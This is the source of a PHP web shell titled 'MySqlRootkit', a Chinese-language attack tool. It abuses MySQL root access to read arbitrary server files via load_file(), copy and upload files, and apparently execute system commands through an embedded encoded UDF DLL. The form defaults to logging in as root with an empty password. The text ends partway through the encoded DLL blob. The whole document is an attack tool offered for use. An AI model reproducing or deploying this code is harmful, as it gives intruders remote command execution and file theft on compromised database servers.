
<html> 
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"> 
<title>∷ MySqlRootkit - by 剑心 ∷ </title> 
<STYLE> 
body{ SCROLLBAR-FACE-COLOR: #719BC5; FONT-SIZE: 12px; SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; SCROLLBAR-SHADOW-COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #ffffff; SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #ffffff; FONT-FAMILY: "宋体"; SCROLLBAR-DARKSHADOW-COLOR: #ffffff
 font-family: 宋体;   font-size: 9pt}

INPUT {BORDER: 1px none silver; } 
</STYLE> 
</head>
<body> 
<form name="form" method=POST action="<?$_SERVER[PHP_SELF]?>" enctype="multipart/form-data"> 
  <p>MySQL用户名：
    <input name="name" type="text" id="name" value="<? echo $_SESSION[name];?>"  style="border: 1px solid #084B8E">
SQL密码：&nbsp; 
<input name="pass" type="password" id="pass" value="<?echo $_POST[pass];?>"  style="border: 1px solid #084B8E">
<br>
主机地址：&nbsp;&nbsp;&nbsp;    
<input name="host" type="text" id="host" value="<?echo $_POST[host];?>"  style="border: 1px solid #084B8E">
主机端口：    
<input name="port" type="text" id="port" value="<?echo $_POST[port];?>"  style="border: 1px solid #084B8E">
<input type="submit" value="登陆主机" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5">
</p>
  <p>
      <input type="text" name="cmd" size=52 style="border: 1px solid #084B8E"> 
    <input type="submit" value="执行命令" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5">
    <font size="2" color="#084B8E">&nbsp;&nbsp;</font></p>
	<input type="text" name="file" size=52 style="border: 1px solid #084B8E"> 
    <input type="submit" value="读取文件" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5">
    <font size="2" color="#084B8E">&nbsp;&nbsp;</font></p>
	源文件地址：&nbsp;&nbsp;
	<input type="text" name="sourcefile" size=39 style="border: 1px solid #084B8E">
	<br>
	目标文件地址：
	<input type="text" name="targetfile" size=39 style="border: 1px solid #084B8E">
    <input type="submit" value="复制文件" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5">
    <font size="2" color="#084B8E">&nbsp;&nbsp;</font></p>
<input type="hidden" name="MAX_FILE_SIZE" value="2000000">
<font size="2" color="#084B8E">&nbsp;&nbsp;</font></p>
选择上传文件：&nbsp;&nbsp;
<input type="file" name="upload" size=39 style="border: 1px solid #084B8E">
	<br>
上传到：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	<input type="text" name="filepath" size=39 style="border: 1px solid #084B8E">
    <input type="submit" value="上传文件" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5">


<p><font color=#3F5294 style='FONT-SIZE: 9pt'>
<?
//读取文件函数
function echofile($file)
{

$query="select test from jnc_temp";
$file = str_replace("\\", '/', $file);
@mysql_query("delete from jnc_temp where 1=1");
if( mysql_query("insert into jnc_temp values(load_file('$file'))") ) 
{
$result = mysql_query($query);
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) 
{
        $row['test']=str_replace(" ","&nbsp;",$row['test']);
		$row['test']=str_replace("<","&lt;",$row['test']);
		$row['test']=str_replace(">","&gt;",$row['test']);
		$row['test']=str_replace(chr(13),"<br>",$row['test']);
		return $row['test'];
}
}
}

function reverse_string($string)
{

$string=str_replace("&nbsp;"," ",$string);
$string=str_replace("&lt;","<",$string);
$string=str_replace("&gt;",">",$string);
$string=str_replace("<br>",chr(13),$string);
return $string;

}


function logout()
{
@mysql_free_result($result);
@mysql_query("Drop TABLE jnc_temp");
@mysql_query("DROP FUNCTION exec");
@mysql_close();
$_SESSION["mix_ok"]="No";
$_SESSION["logon"]="No";
//$_SESSION["dbusername"]='';
//$_SESSION["dbpassword"]='';
//$_SESSION["servername"]='';
//$_SESSION["serverport"]='';
}

//系统变量初试化
session_start();
$logon='No';
$system='';

session_register("logon");

//用到的变量

$servername='localhost';
if($_POST[host]!='') $servername=$_POST[host];
$serverport='3306';
if($_POST[port]!='') $serverport=$_POST[port];
$dbusername='root';
if($_POST[name]!='') $dbusername=$_POST[name];
$dbpassword='';
if($_POST[pass]!='') $dbpassword=$_POST[pass];
$dbname='mysql';

$file="c:\boot.ini";




$Mixdll="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